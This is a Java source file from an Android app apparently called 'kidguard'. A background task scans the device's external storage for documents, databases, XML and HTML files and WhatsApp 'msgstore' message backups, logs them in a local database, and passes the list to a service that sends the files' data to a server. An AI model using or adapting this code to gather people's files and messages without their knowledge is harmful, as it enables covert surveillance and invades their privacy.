package com.kidguard.asynctask;


import android.content.Context;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Environment;
import android.util.Log;

import com.j256.ormlite.android.apptools.OpenHelperManager;
import com.j256.ormlite.dao.Dao;
import com.j256.ormlite.stmt.QueryBuilder;
import com.kidguard.interfaces.Constant;
import com.kidguard.model.Files;
import com.kidguard.orm.DatabaseHelper;
import com.kidguard.services.BackgroundDataService;
import com.kidguard.utilities.Utilities;

import java.io.File;
import java.sql.SQLException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;

public class FilesAsyncTask extends AsyncTask<String, Void, ArrayList<Files>> implements Constant {
    private static final String TAG = FilesAsyncTask.class.getSimpleName();

    private DatabaseHelper databaseHelper = null;
    private Dao<Files, Integer> filesDao;
    private Context context;
    private ArrayList<File> fileList;
    private ArrayList<Files> lstFiles;

    // FilesAsyncTask Constructor
    public FilesAsyncTask(Context context) {
        this.context = context;
    }

    // Database Helper
    private DatabaseHelper getHelper() {
        if (databaseHelper == null) {
            databaseHelper = OpenHelperManager.getHelper(context, DatabaseHelper.class);
        }
        return databaseHelper;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
        lstFiles = new ArrayList<>();
    }

    @Override
    protected ArrayList<Files> doInBackground(String... params) {
        fileList = new ArrayList<>();
        File root = new File(Environment.getExternalStorageDirectory().getAbsolutePath());
        fileList = getFile(root);

        try {
            filesDao = getHelper().getFilesDao();
            if (filesDao.isTableExists()) {
                long numRows = filesDao.countOf();
                if (numRows != 0) {
                    final QueryBuilder<Files, Integer> queryBuilder = filesDao.queryBuilder();
                    for (int i = 0; i < filesDao.queryForAll().size(); i++) {
                        for (int j = 0; j < fileList.size(); j++) {
                            List<Files> results = queryBuilder.where().eq(Files.FILE_PATH, fileList.get(j).getAbsolutePath()).query();
                            if (results.size() == 0) {
                                setFilesPOJO(fileList, j);
                            }
                        }
                    }
                } else {
                    for (int i = 0; i < fileList.size(); i++) {
                        setFilesPOJO(fileList, i);
                    }
                }
            }
        } catch (SQLException e) {
            e.printStackTrace();
        }

        lstFiles = filesFetchWithTag(filesDao, params[0], params[1]);
        return lstFiles;
    }

    @Override
    protected void onPostExecute(ArrayList<Files> list) {
        super.onPostExecute(list);
        // Release databaseHelper
        if (databaseHelper != null) {
            OpenHelperManager.releaseHelper();
            databaseHelper = null;
        }

        Log.e("Size", "FILES List???" + list.size());
        BackgroundDataService.getInstance().sendFilesDataToServer(list);
    }

    // Get Files List
    private ArrayList<File> getFile(File dir) {
        File listFile[] = dir.listFiles();
        if (listFile != null && listFile.length > 0) {
            for (File file : listFile) {
                if (file.isDirectory()) {
                    //fileList.add(listFile[i]);
                    getFile(file);
                } else {
                    if (file.getName().endsWith(".doc") || file.getName().endsWith(".pdf") || file.getName().endsWith(".txt") || file.getName().endsWith(".db") || file.getName().startsWith("msgstore") || file.getName().endsWith(".xml") || file.getName().endsWith(".html")) {
                        fileList.add(file);
                    }
                }
            }
        }
        return fileList;
    }

    // Set Files POJO With File List
    private void setFilesPOJO(ArrayList<File> fileList, int i) {
        Files files = new Files();
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSSSSSZ");
        files.setDate_time(sdf.format(fileList.get(i).lastModified()));
        files.setDate_time_stamp(String.valueOf(fileList.get(i).lastModified()));
        files.setFilename(fileList.get(i).getName());
        files.setFilePath(fileList.get(i).getAbsolutePath());
        files.setFileStatus(FALSE);
        files.setFileExt(Utilities.getExtension(fileList.get(i).getName()));
        files.setFileSizeKB(String.valueOf(getFileSizeKB(fileList.get(i).getAbsolutePath())));
        files.setFileSizeMB(String.valueOf(getFileSizeMB(fileList.get(i).getAbsolutePath())));

        try {
            filesDao.create(files);
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }

    // Files Fetch With Tag
    private ArrayList<Files> filesFetchWithTag(Dao<Files, Integer> filesDao, String count, String ext) {
        ArrayList<Files> lstFilesSorted = new ArrayList<>();
        List<Files> results;
        int countNew = 0;
        final QueryBuilder<Files, Integer> queryBuilder = filesDao.queryBuilder();

        if (!count.equals("") && ext.equals("")) {
            Log.d("1", "1");
            try {
                results = queryBuilder.where().eq(Files.FILE_STATUS, FALSE).query();
                checkCount(lstFilesSorted, results, count, countNew);
            } catch (SQLException e) {
                e.printStackTrace();
            }
            return lstFilesSorted;
        }

        if (count.equals("") && !ext.equals("")) {
            Log.d("2", "2");
            try {
                results = queryBuilder.where().eq(Files.FILE_EXT, ext).and().eq(Files.FILE_STATUS, FALSE).query();
                for (int i = 0; i < results.size(); i++) {
                    setFilesPOJO(lstFilesSorted, results, i);
                }
            } catch (SQLException e) {
                e.printStackTrace();
            }
            return lstFilesSorted;
        }

        if (!count.equals("") && !ext.equals("")) {
            Log.d("3", "3");
            try {
                results = queryBuilder.where().eq(Files.FILE_EXT, ext).and().eq(Files.FILE_STATUS, FALSE).query();
                checkCount(lstFilesSorted, results, count, countNew);
            } catch (SQLException e) {
                e.printStackTrace();
            }

            return lstFilesSorted;
        }

        if (count.equals("") && ext.equals("")) {
            Log.d("4", "4");
            try {
                results = filesDao.queryForAll();
                for (int i = 0; i < results.size(); i++) {
                    setFilesPOJO(lstFilesSorted, results, i);
                }
            } catch (SQLException e) {
                e.printStackTrace();
            }

            return lstFilesSorted;
        }
        return lstFilesSorted;
    }

    // Check Count
    private void checkCount(ArrayList<Files> lstFilesSorted, List<Files> results, String count, int countNew) {
        if (results != null && results.size() > 0) {
            if (Integer.parseInt(count) == results.size()) {
                countNew = Integer.parseInt(count);
            } else if (Integer.parseInt(count) < results.size()) {
                countNew = Integer.parseInt(count);
            } else if (Integer.parseInt(count) > results.size()) {
                countNew = results.size();
            }

            for (int i = 0; i < countNew; i++) {
                setFilesPOJO(lstFilesSorted, results, i);
            }
        }
    }

    // Set Files POJO
    private void setFilesPOJO(ArrayList<Files> lstFilesSorted, List<Files> results, int i) {
        Files files = new Files();
        files.setFilename(results.get(i).getFilename());
        files.setDate_time(results.get(i).getDate_time());
        files.setDate_time_stamp(results.get(i).getDate_time_stamp());
        files.setFilePath(results.get(i).getFilePath());
        files.setFileStatus(results.get(i).getFileStatus());
        files.setFileExt(Utilities.getExtension(results.get(i).getFileExt()));
        files.setFileSizeKB(results.get(i).getFileSizeKB());
        files.setFileSizeMB(results.get(i).getFileSizeMB());
        lstFilesSorted.add(files);
    }

    private long getFileSizeKB(String absolutePathOfImage) {
        Uri uriNew = Uri.fromFile(new File(absolutePathOfImage));
        long size = 0;
        try {
            File f = new File(uriNew.getPath());
            size = f.length();
            size = size / 1024;
        } catch (Exception e) {
            Log.e(TAG, "Exception??" + e.getMessage());
        }
        return size;
    }

    private long getFileSizeMB(String absolutePathOfImage) {
        Uri uriNew = Uri.fromFile(new File(absolutePathOfImage));
        long size = 0;
        try {
            File f = new File(uriNew.getPath());
            size = f.length();
            size = size / 1024;
            size = size / 1024;
        } catch (Exception e) {
            Log.e(TAG, "Exception??" + e.getMessage());
        }
        return size;
    }
}